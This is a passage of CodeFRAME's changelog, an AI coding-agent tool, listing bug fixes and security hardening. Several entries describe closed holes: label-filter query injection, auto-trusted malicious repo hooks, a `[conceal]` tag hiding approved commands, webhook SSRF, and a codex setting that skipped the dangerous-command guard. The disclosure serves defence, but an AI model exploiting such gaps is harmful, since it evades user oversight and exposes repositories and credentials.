  workspace record", and the only recovery deleted the accounts too. Serving
  after `cf init` wrote users and keys into the repo's task data. The default is
  now `.codeframe/platform.db`, resolved in one place for the server, auth and
  `cf auth`. An install whose accounts already live in `state.db` keeps using
  it, with a warning, until it moves the file or sets `DATABASE_PATH`.

- **The web UI image builds again (#1364).** A `braces` advisory with no
  patched release (GHSA-vfj7-8cjw-p6xm) failed the in-image `npm audit` gate,
  so every staging deploy since 2026-10-03 failed. The only dependent,
  `@next/eslint-plugin-next`, gets `tinyglobby` in place of `fast-glob` through
  a scoped npm `overrides` entry, which removes `braces` and `micromatch` from
  the tree. The audit gate is unchanged.

- **Following a PROOF9 stub can satisfy its gate (#1284).**
  - The E2E and DEMO stubs are now pytest files (`draft_test_*_e2e.py`,
    `draft_test_*_demo.py`). They used to be Playwright TypeScript and a
    showboat script, which the runner's `pytest -k test_<gate>_<slug>` never
    collects, so a developer who followed them got FAILED forever. E2E is an
    obligation of five of the seven glitch types.
  - The PERF stub fails until written. It used to time an empty block, so it
    passed as soon as it was renamed and recorded evidence for work nobody did.
  - The SEC gate's bandit scan skips test code (`tests/`, `test_*.py`,
    `*_test.py`, `conftest.py`) and the virtualenv, so an implemented test stub
    no longer fails it on `assert` or `subprocess`. B101 still applies to
    application code, where `python -O` strips an `assert` used as a check.

- **"Close the GitHub issue when the task is DONE" works for a repo connected
  in the web UI (#1283).**
  - Integrations → Connect stores the PAT in the connecting user's own
    credential store, but auto-close and reconciliation read only the
    machine-wide one. They logged "no stored PAT" and did nothing unless
    `GITHUB_TOKEN` was also exported.
  - Connect now records who connected the repo, in
    `~/.codeframe/github_connection_owners.json`. This is deliberately
    outside the workspace, because a workspace's `.codeframe/` can be written
    by whatever runs there.
  - Both background paths now use that user's stored PAT, then the
    machine-wide store, then `GITHUB_TOKEN`. In hosted mode the operator's
    `GITHUB_TOKEN` is never used for a user.

- **Live output works for every engine, and ends when the run does (#1282).**
  - `cf work follow` used to check for completion only when a new line arrived,
    so it kept following a finished run that had stopped printing. It now
    exits as soon as the run ends.
  - Claude-code, codex, opencode and kilocode never wrote `output.log`, so
    `follow` and the web UI's output view showed nothing for them. Their output
    is now logged, including codex's agent messages.
  - The task event stream in the web UI now notices a run that a batch
    subprocess finished, instead of sending heartbeats forever.
  - Agent output is printed literally, so a stray markup tag in it cannot crash
    `follow`.

- **`cf work resume` and `cf work retry` keep the task's engine, and
  `--dry-run` is no longer a real run on an external engine (#1281).**
  - Resume always fell back to the built-in engine, and retry had no
    `--engine` option at all. So a claude-code task switched engines partway
    through, or failed outright for lack of an `ANTHROPIC_API_KEY`.
  - Start, resume, retry and batch run now choose the engine the same way:
    `--engine`, then `CODEFRAME_ENGINE`, then the workspace config, then
    `react`. The API key check uses that same engine.
  - `--dry-run` never reached claude-code, codex, opencode or kilocode. They
    edited the repository, the task went DONE, and auto-close could close its
    GitHub issue. With an external engine, `--dry-run` is now refused before
    any run is created.

- **No run, task or batch is left stuck in RUNNING (#1280).** Several things
  used to leave state behind with nothing running, so the next start, run or
  resume refused the task or re-did finished work:
  - an error before the agent starts, such as a typo in `--llm-provider`;
  - Ctrl+C or SIGTERM during `cf work start`, `cf work batch run` or
    `cf work batch resume`;
  - a graceful `batch stop`.
  Such a run is now marked failed and an interrupted batch CANCELLED, so it
  can be resumed. A late error does not overwrite a stop the user already
  made. A graceful stop keeps the result of the task that was still running.
  A task whose dependency in the same batch failed is no longer run. It is
  recorded as `SKIPPED`, which the web UI shows as "Skipped (dependency)" and
  does not announce as a blocker. A resume, or the next `--retry` round, runs
  it once the dependency succeeds. Batches run in dependency order. A
  dependency cycle still runs, as before.
  `cf work batch resume` now counts tasks that never started, as the API
  already did. The "already has an active run" error names
  `cf work stop <task>`.

- **Stop now stops the run (#1279).** `cf work stop`, the web UI's Stop, a
  forced batch stop and reconciliation used to mark the run failed while
  nothing told the running agent. A delegated CLI such as claude, codex or
  opencode, and anything it had started, kept running and editing the tree.
  The task could be started again on top of it. Now:
  - the ReAct and plan engines and the delegated-CLI adapters check for a stop
    once a second, or once per step;
  - each CLI runs in its own process group, and the whole group is stopped;
  - a restart is refused until the stopped agent has actually exited;
  - `--retry` no longer restarts a task the user stopped;
  - Ctrl+C or closing the terminal reaches batch workers and their CLIs.
  A process group is only signalled once it is proven to be our own child's.
  An agent cannot be stopped in the middle of an LLM call it has already made.

- **`cf pr merge` now scopes its PROOF9 gate to the PR's own files, like the
  API (#1254).** The CLI still checked every requirement in the workspace, so
  `cf pr merge` and the web UI could disagree about the same PR. The changed
  files are fetched only when something would otherwise block, and they
  include a rename's old path. Any failure falls back to the workspace-wide
  check. A scope captured as `./x.py`, `src/../x.py` or `./` used to match no
  file at all. Scope paths are now normalized in both gates and in
  `cf proof run`, and a root scope covers every file.

- **`cf proof capture --where` handles absolute paths correctly (#1258).** An
  absolute path inside the workspace now becomes a repo-relative file scope.
  Before, some absolute paths were stored as file scopes that could never
  match, so a scoped merge gate let the PR through: paths with a space, a `+`
  or a drive letter (`C:/…`), and `~/…`, `file://…` or `\…` paths. A path
  that cannot be repo-relative is now stored as a tag, which blocks the gate
  instead. The capture prints a warning naming that path. Routes such as
  `/login` are still routes, even under a repo at `/app`.

- **A dead OS keyring no longer hangs credential reads (#1181).** On a
  headless box, container or SSH session with no D-Bus, SecretService can be
  selected and then never answer. Every credential read blocked forever,
  including `GET /api/v2/settings/keys`. Each keyring call now has a time
  limit, `CODEFRAME_KEYRING_TIMEOUT` (default 2.0s). After a timeout, the store
  falls back to the encrypted file for the rest of the process.
  `CODEFRAME_DISABLE_KEYRING=1` skips the keyring entirely. The API's
  credential calls now run off the event loop, so a slow keyring holds up only
  its own request.

- **The codex engine can run on an API key, and kilo 7.x stays logged in
  (#1270).** `codex app-server` ignores API keys in its environment, so a
  key-only setup failed with "401 Missing bearer". CodeFRAME now logs codex in
  through its protocol with `CODEX_API_KEY`, or else the OpenAI key from the
  environment or `cf auth setup`. The login runs in a private per-run
  `CODEX_HOME`, and its `auth.json` is deleted right after login. An existing
  `codex login` wins over a key, so a ChatGPT plan is not switched to metered
  billing. kilo 7.x keeps its login in `~/.config/kilo` and
  `~/.local/share/kilo`; both now pass through, and Anthropic/OpenAI keys
  now reach it.

- **Create PR in the web UI works again (#1272).** The Review page sent an
  empty branch name, and the backend rejected it with a 422. It now sends the
  checked-out branch, shows it in the panel ("From branch …") and checks it
  again when you click. On a detached HEAD or a repo with no commits, the
  button is disabled and says why.

- **CLI commands no longer crash when an argument contains Rich markup
  (#1054, #1206).** A value such as `[/b]` in a command argument or a stored
  field raised `MarkupError`. In `except` handlers, that turned an error
  CodeFRAME had already caught into a crash. Commands fixed include
  `cf blocker list`, `cf prd show` and `cf hooks`. User text, including
  arguments echoed in error messages, is now escaped before it is rendered.
  CI tests every command against hostile markup, and a new command fails CI
  until it is checked.

- **Starting PRD discovery twice no longer leaves an orphaned session
  (#1042, #1202).** Two concurrent `POST /api/v2/discovery/start` calls could
  both create a session. The database now allows one active session per
  workspace, and an upgrade closes all but the newest existing one. A reset
  during a slow LLM call used to be undone by the save that followed. Now that
  call returns 409. In `cf prd generate`, declining to resume closes the old
  session. `--resume <id> --force` (`-f`) takes over a slot another session
  holds. Reset in the web UI now closes the session it displays.

- **`/health` reports the build that is actually running (#1160).** In a
  container, `commit` was always `unknown`, and `deployed_at` was the time of
  the request. `commit` is now the `GIT_COMMIT` stamped into the image at build
  time. `deployed_at` is when the process started. The deploy workflow fails
  if the reported commit is not the one it built. **Behavior change:**
  `codeframe serve` from a source checkout reports `commit: "unknown"` unless
  `GIT_COMMIT` is set.

- **Saving AGENTS.md in place during a batch run no longer drops it from the
  agent's instructions (#1219).** An editor that truncates and then writes the
  file could be caught at zero bytes. The watcher then reloaded that file's
  instructions as empty. A file that had content and now reads as empty is
  treated as mid-write. The reload, including other files changed in the same
  poll, waits until it settles. A file that stays empty for three polls is
  taken as a deliberate clear and reloaded.

- **Three ways the PROOF9 merge gate let a merge through (#1276).** Both `cf pr
  merge` and the web/API merge now block on:
  - a **lapsed waiver**: a requirement whose waiver expiry date has passed blocks
    like an OPEN one. The check is read-only and does not change the
    requirement's status; `cf proof` still does that;
  - a **0.9.3-era absolute path** in a requirement's stored file scope. These
    paths never matched a PR's repo-relative paths. They are rewritten once:
    inside the repo, the path becomes relative; any other path becomes a
    match-everything tag;
  - a **PR with more than 3000 files**. GitHub silently truncates the file list
    at 3000, so a requirement on a file beyond the cap escaped. A list at the
    cap, or one whose length disagrees with the PR's `changed_files`, is now
    refused, and the gate checks every requirement in the workspace instead.

- **Keys saved with `cf auth setup` or Settings → API Keys are now used
  (#1264).** The credential store was write-only. Every LLM path read the
  environment, so a saved and verified key still produced
  `ANTHROPIC_API_KEY is not set`. One resolver now checks the environment
  first, then the stored key.
  - Server requests use the signed-in user's own store; `cf` uses the
    machine-wide one.
  - Batch runs and delegated coding CLIs receive the resolved key.
  - In hosted mode a tenant gets only its own stored key, never the
    operator's.
  - **Behavior change:** if you ran `cf auth setup` and are also logged in to
    `claude` or `codex` by subscription, the stored key is now forwarded to
    that CLI, which may then bill the API key.

- **The codex engine no longer reports a task done when it wrote nothing, and
  its dangerous-command guard now runs (#1278).** A codex turn that finished
  without changing a file, or making a commit, used to go to the gates as
  `completed`. The gates then checked an unchanged tree. It now fails, or
  becomes a blocker when the agent was asking a question, the same way
  claude-code, opencode and kilocode already behave. Codex also ran with
  `approvalPolicy: never`, so it never sent the approval requests that the
  #916 guard vets. It now sends `on-request`. Work still runs inside the
  `workspace-write` sandbox without prompting. A request to go outside the
  sandbox is **declined**, and it is named when it matches a dangerous pattern.
  Auto-accepting was not an option: when codex gets an approval, it runs the
  command outside the sandbox. `2>/dev/null` and other redirects to
  `/dev/null`, `/dev/stdout` or `/dev/stderr` no longer count as writes to a
  device.

- **Telemetry no longer defaults to a domain the project does not own (#1269).**
  The default collector was `telemetry.codeframe.dev`. That domain lapsed and is
  listed for sale, so whoever bought it would have received every opted-in
  install's usage and crash events. The default is now
  `https://telemetry.codeframe.sh/v1/events`, on the domain every other project
  address already uses. Telemetry is still off unless you opt in, and an
  endpoint you set yourself (`CODEFRAME_TELEMETRY_ENDPOINT` or `endpoint` in
  `~/.codeframe/telemetry.json`) still wins. If you copied the old URL into
  either of those by hand, change it.

- **`cf hooks set` / `cf hooks clear` no longer approve a cloned repo's hooks
  (#1263).** Both commands used to re-record trust for *every* configured hook
  after the edit, so `cf hooks clear after_init`, run to disarm hooks, approved a
  committed `before_task` payload, and the next `cf work start` ran it. Trust now
  carries forward only when the hooks were already trusted (or none existed);
  otherwise the edit is saved untrusted and the command points to
  `cf hooks trust`. `cf hooks trust`, `show` and `run` also print hook commands
  and output verbatim, so a `[conceal]` tag can no longer hide part of the
  command being approved.
- **`cf work start --execute` no longer ends in a blocker on the README install
  path (#1262).** After `uv tool install codeframe-ai`, ruff and bandit (both
  runtime dependencies) live in the tool's own venv, off PATH, and a user's
  project normally does not depend on them. The ruff gate ran `uv run ruff`,
  uv failed to spawn it, and the gate reported FAILED on clean code, which the
  agent could not fix. The ruff and bandit (PROOF9 SEC) gates, the agent's
  per-edit lint and autofix, and `cf review`'s security scanner now use the
  project's own copy when it has one and CodeFRAME's bundled copy otherwise.
  They report SKIPPED only when no copy can be started, and a tool that ran and
  failed still reports FAILED. The ruff gate also now hands its findings (file,
  line, rule) to self-correction; before, the agent saw only "Found 1 error.".
  The cleanroom harness records a finding whenever `6-work-start` fails. Every
  archived run had failed that step with an empty `findings.tsv`.

- **The staging health-check timer is retired, not repaired (#969).** Its unit
  named the maintainer's account in `User=` and repeated their home directory in
  four paths, so the plan was to parameterize it. Review of that fix surfaced the
  real problem: `scripts/health-check.sh` remediates by starting PM2 from
  `ecosystem.staging.config.js`, and both that file and the `start-staging.sh` it
  prefers are untracked — staging has deployed with `docker compose` since the
  container rebuild, and `deploy.yml` touches pm2 only to kill legacy processes.
  Its `restart_services()` logged `✓ Restart command completed` after `|| true`
  pm2 calls that did nothing, which is the same defect as `deploy.sh`. Repairing
  the unit would only have made an ineffective remediation installable on any
  machine instead of one. `scripts/health-check.sh`,
  `scripts/install-health-check.sh` and both `systemd/` units are gone; the
  `systemd/` directory with them. `tests/test_pm2_scoping_912.py` — the
  production-outage guard from #912/#1121 — is unchanged in substance: it still
  scans every staging path for host-wide `pm2`/`docker` commands, and its
  anti-vacuity check now anchors on `deploy.yml` and the compose files rather
  than on the retired script.

- **The `.env` examples and a captured fixture no longer name one machine
  (#969).** `.env.staging`/`.env.production` examples point at `/opt/codeframe`,
  and a captured kilocode `--help` fixture no longer ships the maintainer's cwd
  as its `--workspace` default — nothing asserts on that path, only on its shape.
  `tests/test_ops_hygiene_969.py` pins all of it by defect class rather than by
  filename: no shipped file or captured fixture may carry a personal home path,
  no script may announce simulated success, no installer may reference a unit
  file that does not exist, every tracked shell script must be tracked
  executable, and no workflow may resolve this project's npm dependencies
  without the lockfile.

### Security

- **A GitHub issue-search label can no longer read another repo's issues
  (#1275).** A `"` in the `label` filter closed the label phrase and could add
  a `repo:` qualifier. That listed issues from any repo the stored PAT could
  read. This is the #956 hole reached through a different field. Quotes and
  backslashes are now removed from the label and from free-text search words.

- **pytest is raised to 9.x to clear GHSA-6w46-j5rx-g56g (#1244).** pytest is
  a runtime dependency, because the PROOF9 gate runs it and the generated
  stubs import it. Versions below 9.0.3 have the advisory's vulnerable tmpdir
  handling. The pin is now `pytest>=9.0.3,<10`, with `pytest-asyncio>=1.4.0`.

### Added

- **`DESIGN_PARTNERS.md` — the beta design-partner program (#619).** #618 shipped
  the intake path but nothing said what applying got you. The page states the
  offer (direct line to the maintainer, roadmap influence weighted ahead of
  general requests, opt-in public credit, continuity into commercial pricing),
  the commitment (real usage over a full cycle, a bi-weekly cadence, and either a
  paid pilot or a written time commitment), a 5-10 team cohort, the six intake
  questions, and activation the week after the launch announcement. It reuses the
  existing `hello@codeframe.sh` + pinned-Discussion intake rather than opening a
  second inbox, and publishes no pilot price — `LICENSING.md` says pricing is
  still being finalized and a number here would contradict it. Linked from
  `README.md` and `LICENSING.md`; `tests/test_design_partners_619.py` and the
  `ROOT_DOCS` link check pin all of it.

### Changed

- **The Anthropic adapter runs on the `anthropic` 1.x SDK; the `<1.0` ceiling is
  lifted to `>=1.0,<2` (#1170).** 0.9.3 capped the SDK to stop the bleeding from
  #1168, which froze the project on the 0.x line. 1.x removed `temperature`,
  `top_p` and `top_k` from `Messages.create()`; they did **not** move to
  `output_config` (that parameter is `{effort, format}`). The adapter now sends
  `temperature` in `extra_body`, which the SDK merges into the request JSON
  verbatim — so the request on the wire is unchanged, and the #767 invariant
  holds: `temperature=0.0` is a real request for deterministic sampling, never
  "unset". Sampling is still accepted by the API on the models CodeFrame
  defaults to (`claude-sonnet-4-5`, `claude-haiku-4-5`); the newer families that
  reject it (Opus 4.7+, Opus 5, Sonnet 5) rejected it on 0.x too, so this is
  behavioural parity rather than a new limitation. Verified against the live API
  on 1.2.0 across all five paths the adapter uses — completion, tool use, tool
  results, sync streaming, and async streaming including the interleaved-thinking
  beta branch. No `httpx` -> `httpx2` work was needed: the adapter hands the SDK
  no `httpx` objects. The major ceiling stays on purpose.

### Fixed

- **Self-correction token/cost records were silently dropped (#1168 follow-up, #1176).**
  `ReactAgent` bills each verification-fix retry as `call_type="verification_fix"`
  (`react_agent.py:943`), but `CallType` never defined that member, so `TokenUsage`
  rejected every such record and `_persist_token_usage` swallowed it with only a
  WARNING (#712). Every self-correction cycle's tokens and cost vanished from
  `token_usage` — the same data-loss class as #558's int-cast UUID task IDs.
  The column is `call_type TEXT` with no `CHECK` constraint, so the enum was the
  whole fix; no migration. Caught by the cold-start cleanroom run against
  published `0.9.3`, which was the first run to get far enough to reach the code.
  Guarded by a test that pins every `call_type` literal `react_agent` emits
  against the enum, so the next unlisted one fails in CI rather than in a release.

## [0.9.3]

**Published `codeframe-ai 0.9.2` was dead on arrival, the same as `0.9.1` before it
(#1168).** `pyproject.toml` pinned `anthropic>=0.18.0` with no ceiling. A fresh
`uv tool install codeframe-ai` resolved that to `anthropic` 1.0.0, which removed
`temperature` from `Messages.create()` — every LLM-backed command (`cf prd
generate`, `cf tasks generate`, `cf work start`, ...) raised `TypeError` on the
first call, on the exact install path the README documents. `uv.lock` resolves
`anthropic` 0.70.0, so CI and every developer machine never saw it.

This is the second consecutive release dead on arrival on the published-package
install path while every existing gate stayed green — `0.9.1` shipped retired
model IDs (#1112), `0.9.2` shipped this. Neither the test suite nor CI installs
the published package the way a new user does; only the cold-start cleanroom
harness (`scripts/quickstart-cleanroom/run.sh`) catches it, and it was not run
against `0.9.2` before release.

### Fixed

- **`anthropic` is now pinned `>=0.18.0,<1.0` (#1168, #1174).** The ceiling is
  load-bearing, not caution: it stops the next SDK major bump from silently
  breaking every fresh install the same way. A new guard test
  (`tests/adapters/test_sdk_kwargs_guard_614.py`) asserts every keyword argument
  the adapter sends unconditionally is one the *installed* SDK still accepts, so
  a future signature drift fails in CI instead of in a release.
- **`codeframe.__version__` no longer lies (caught by pre-PR `codex review`
  during this release).** It was a hand-typed literal (`"0.1.0"`) that had not
  been bumped since the module was written, so `cf version`, every telemetry
  event, and the Codex adapter's user-agent all reported `0.1.0` through the
  `0.9.0`, `0.9.1` and `0.9.2` releases — the same "artifact metadata lies
  about the artifact" failure class as #1112 and #1168, a third instance the
  existing `tests/test_root_docs_950.py` version-drift guard never covered
  because it only checked README/CHANGELOG against `pyproject.toml`, not the
  package itself. `__version__` is now read from installed package metadata
  via `importlib.metadata.version("codeframe-ai")` (falling back to
  `"0.0.0+unknown"` for an uninstalled source checkout) so it can't drift from
  `pyproject.toml` again, and the guard test now asserts the imported
  `codeframe.__version__` matches the pyproject version too.

## [0.9.2]

**0.9.1 could not work for anyone** and should not be used: it pinned five
Anthropic model IDs that have since been retired, so every LLM-backed command
returned a 404 on a fresh install even with a valid API key (#1112). The IDs
were already corrected in the repository and had simply never been released.

Over 200 further commits since v0.9.1. `SECURITY.md` supports only the latest release, so the
security section below is the one to read before deploying anything older.

### Security

Several of these change defaults and will require configuration on an existing deploy.

- **`WORKSPACE_ROOT` has one meaning and fails closed (#896).** It is an
  `os.pathsep`-separated allowlist of permitted workspace roots, never a location, and
  nothing creates it. The server now **refuses to start** when auth is enforced and no
  allowlist is set — an empty allowlist let any authenticated user open a session, and
  therefore a terminal shell, in any host directory. `CODEFRAME_ALLOW_UNRESTRICTED_WORKSPACES=1`
  is the documented single-operator local escape hatch.
- **Bootstrap registration is gated (#897).** `POST /auth/register` is unauthenticated by
  design for the first account. It now requires `CODEFRAME_BOOTSTRAP_TOKEN` as an
  `X-Bootstrap-Token` header, or a genuinely host-local request. **Required for any deploy
  reachable over a network**: without it, a fresh instance is claimable as admin by
  whoever reaches the route first.
- **Scopes are real, not decorative (#898).** A JWT principal's scopes derive from its
  user row — `read`/`write` always, `admin` only for a superuser — so
  `require_scope(SCOPE_ADMIN)` now genuinely refuses a non-superuser browser session on
  credential storage and PR merge. Only a superuser may mint an admin-scoped API key.
  Workspace-registry ownership is write-once, so one user can no longer take over
  another's registered `repo_path`.
- **Untrusted-repository boundaries closed.** A cloned repo can commit files that used to
  steer the process: lifecycle hooks now require a recorded trust decision (#905), a
  repo-supplied `llm.base_url` is refused unless it is loopback or explicitly opted into
  (#903), every `.env` variant is ignored rather than an enumeration (#895), and a
  repository `.env` can no longer override the operator's environment or supply
  security-steering keys (#904).
- **Subprocess containment.** Plan-engine and gate subprocesses run with one allowlisted
  environment (#907), plan-engine file operations are confined to the workspace (#906),
  `review_files()` likewise (#899), and secrets are stripped from the LLM `run_command`
  environment (#721). Delegated coding CLIs run with a sandboxed `$HOME` by default
  (#996) — 69 inherited environment variables including 5 API keys, down to 12 and none.
- **Streams no longer carry JWTs in URLs (#745).** An authenticated
  `POST /auth/stream-ticket` mints a 60-second single-use ticket, accepted as `?ticket=`
  on the two SSE and two WebSocket routes only. `?token=<JWT>` is no longer accepted
  anywhere.
- **Outbound webhook SSRF is blocked at dispatch, not only at save (#746, #656).**
  `send_event` resolves the host, rejects private/loopback/link-local/metadata/CGNAT
  addresses, and pins the vetted IPs into the connector — defeating a hand-edited config
  and DNS rebinding (e.g. `169.254.169.254`).
- **Credential handling (#772).** `CODEFRAME_CREDENTIAL_SECRET` mixes into the PBKDF2 KDF
  for the encrypted-file fallback; unset, the key derives from the non-secret machine id
  alone, which is obfuscation and not confidentiality. Credentials are per-user scoped in
  hosted mode (#790), and sharing them across trust domains is blocked (#718).
- **Hosted multi-tenancy.** Session REST endpoints are owner-scoped with TOCTOU path
  revalidation (#704), GitHub PR endpoints are scoped to the caller's credential and repo
  (#900), `GET /workspaces/exists` enforces the allowlist (#719), and registry
  list/delete are owner-scoped (#720).
- **Auth hardening.** The server hard-fails on a default `AUTH_SECRET` whenever auth is
  enabled (#643); `/auth/jwt/login` and `/auth/register` are rate-limited (#644); the JWT
  lifetime dropped from 7 days to 24 hours and the web UI ships a CSP (#657); the
  security-event taxonomy is actually emitted rather than merely defined (#937); a
  disabled account cannot log in (#938); and the test-only `/test/broadcast` route is
  behind `CODEFRAME_ENABLE_TEST_ENDPOINTS` (#753).
- The server warns at startup when in-memory rate limiting is used with multiple workers,
  where each worker keeps its own counters and the effective limit multiplies (#678).

### Added

- **A release guard that fails the build on an unresolvable model default
  (#1112).** `scripts/check_model_defaults.py` runs before `uv build` and
  rejects any dated model ID in the defaults or at a live call site, and — with
  `MODEL_GUARD_REQUIRE_LIVE=1`, as the release job sets — verifies each default
  actually resolves against the API. A missing `ANTHROPIC_API_KEY` secret fails
  the release rather than silently skipping the check.

- **Phase 5.5 — GitHub Issues import.** Connect a repo with a PAT from Settings →
  Integrations (#563), browse its open issues with search, label filter and pagination
  (#564), and import selected issues as tasks with `github_issue_number`/`external_url`
  traceability, atomic dedupe, and opt-in auto-close when the task reaches DONE (#565).
- **Phase 5.4 — PRD stress-test in the web UI.** An SSE endpoint streams goal analysis
  live (#561); results render as severity-tagged ambiguity cards, and answering the
  blocking ones folds them into a new PRD version (#562).
- **Phase 5.3 — Async notifications.** A browser + in-app notification centre with
  workspace-scoped persistence (#559), a cross-page watcher so batch completions and new
  blockers fire even when the execution page is unmounted (#652), and an outbound webhook
  with a test button (#560).
- **Phase 5.2 — Cost visibility.** Spend summary (#557) plus per-task and per-agent
  breakdowns, with an inline cost badge on task cards (#558).
- **Phase 5.1 — Settings.** Working Agent, API Keys and PROOF9-defaults tabs (#554–#556);
  `run_proof()` honours `enabled_gates` and `strictness`.
- **Server-side PROOF9 merge gate (#731).** `POST /api/v2/pr/{n}/merge` blocks while open
  (non-waived) requirements exist. An explicit `override: true` + `override_reason`
  bypasses it and records an audit entry (actor, reason, bypassed requirements,
  timestamp), surfaced as `merge_override` in `GET /api/v2/pr/history`. A proof-ledger
  failure blocks the merge with an explicit 500 rather than silently allowing it. `cf pr
  merge` enforces the same gate with `--override --reason "..."`.
- **Worktree isolation with real merge-back (#787)**, so parallel agents no longer share a
  tree.
- **Per-user credential scoping for hosted mode (#790).**
- **A rewritten Playwright browser suite for the Phase-3+ UI (#684)**, with the config
  starting both servers itself.
- **A proactive web-UI auth guard plus an SSE/WebSocket token-expiry re-auth path (#651).**

### Fixed

- **Retired Anthropic model IDs in the published package (#1112).** The
  `DEFAULT_*_MODEL` constants use undated aliases (`claude-sonnet-4-5`,
  `claude-haiku-4-5`), which Anthropic repoints, rather than dated IDs, which it
  retires.
- **`cf auth` reported valid API keys as invalid (#1112).** Key validation
  probed `claude-3-haiku-20240307`, itself already retired. It now uses the
  shared alias, as does the settings API's Anthropic key verification.

- Token/cost data was silently dropped: `react_agent` int-cast UUID task ids and stored
  NULL in `token_usage` (#712, #558).
- A bad GitHub PAT returned 401, which the web UI treated as session expiry and logged the
  user out; upstream GitHub 401s are now remapped to 400/502 with typed errors (#734).
- `cf init` no longer runs a cloned repository's `after_init` hook without a trust
  decision (#905).
- The default-`AUTH_SECRET` warning no longer prints on every `cf` command.
- Numerous correctness fixes across the conductor, PROOF9 ledger, CLI, task store and web
  UI — see the commit log for the full list.

### Changed

- **Coverage is enforced (#948).** `.coveragerc` sets `fail_under = 80`; the README badge
  and the contribution rule were corrected from an 88%/85% that nothing measured and that
  was not true (the real figure is 81.9%).
- **`uv run pytest` is offline and free by default (#946).** `e2e_llm` and `lifecycle` are
  deselected unless explicitly requested; collection no longer copies the repository's
  `ANTHROPIC_API_KEY` into the process environment.
- **`scripts/lifecycle --mode api|web` exits 3** instead of reporting success for stubs
  that only ever raised `NotImplementedError` (#948).
- Root documentation was brought back in line with the shipped product (#950).
- **The cloud engine is experimental and gated (#966).** `--engine cloud` (E2B) now
  refuses to run unless `CODEFRAME_ENABLE_CLOUD_ENGINE=1` is set, and it is gone from
  `cf engines list`, the `--engine` help, the config validator's suggestions, and the
  docs that counted it as shipped. **This breaks existing `--engine cloud` invocations**
  — set the variable to keep them working. E2B execution is out of launch scope and does
  not work end to end; the known defects are recorded under `CODEFRAME_ENABLE_CLOUD_ENGINE`
  in `CLAUDE.md` as the checklist for lifting the gate. `--isolation cloud` was never
  implemented and is unchanged.

## [0.9.1] - 2026-06-13

### Added
- `cf --version` / `cf -V` prints the installed version. (Note: with `uv tool install`, check the version via `uv tool list` or `cf --version` — the package is isolated, so a system Python's `importlib.metadata` will not see it.)
- `TRADEMARKS.md` — trademark policy clarifying that the AGPL covers the code, while the CodeFRAME name and logo are reserved trademarks (a fork may use the code but must rename).

### Fixed
- The default-`AUTH_SECRET` warning no longer prints on every `cf` command. It was emitted at import time and leaked onto the CLI (which never uses auth); the check now lives only in server startup validation, which still warns in self-hosted mode and fails hard in hosted mode.

### Changed
- README marks the CodeFRAME™ trademark and links the new policy; `LICENSING.md` notes the code/brand boundary.

## [0.9.0] - 2026-06-12

First public beta and the first release published to PyPI as
[`codeframe-ai`](https://pypi.org/project/codeframe-ai/). The `codeframe` name
on PyPI is taken by an unrelated package; a [PEP 541](https://peps.python.org/pep-0541/)
name claim is being pursued in parallel. The CLI entry point remains `cf`.

### Added
- **PyPI distribution.** Install with `uv tool install codeframe-ai`, `uvx codeframe-ai`, or `pipx install codeframe-ai`. Both `cf` and `codeframe` console scripts are provided.
- **Release automation.** Tag-triggered workflow builds with `uv build` and publishes to PyPI via [trusted publishing](https://docs.pypi.org/trusted-publishers/) (OIDC, no long-lived tokens). All actions are SHA-pinned.
- **Launch documentation.** `SECURITY.md` (private vulnerability reporting), `LICENSING.md` (plain-language AGPL-3.0 + commercial path), beta issue templates, and a refreshed `CONTRIBUTING.md`.
- This `CHANGELOG.md`.

### Fixed
- **Packaging was incomplete.** The wheel previously shipped only the top-level `codeframe` package (2 files), so an installed `cf` failed on import. Builds now include all subpackages and the `templates/` runtime data via setuptools auto-discovery.
- **Incorrect license metadata.** Package metadata declared MIT; the project is and always has been AGPL-3.0. Metadata now matches the `LICENSE` file.

### Changed
- Version bumped from a placeholder `0.1.0` to an honest beta `0.9.0`; development status classifier moved to `4 - Beta`.
- README installation section now leads with `uv tool install` instead of git-clone; status badge updated to **beta** with a stability statement.

[Unreleased]: https://github.com/frankbria/codeframe/compare/v0.9.2...HEAD
[0.9.2]: https://github.com/frankbria/codeframe/compare/v0.9.1...v0.9.2
[0.9.1]: https://github.com/frankbria/codeframe/compare/v0.9.0...v0.9.1
[0.9.0]: https://github.com/frankbria/codeframe/releases/tag/v0.9.0
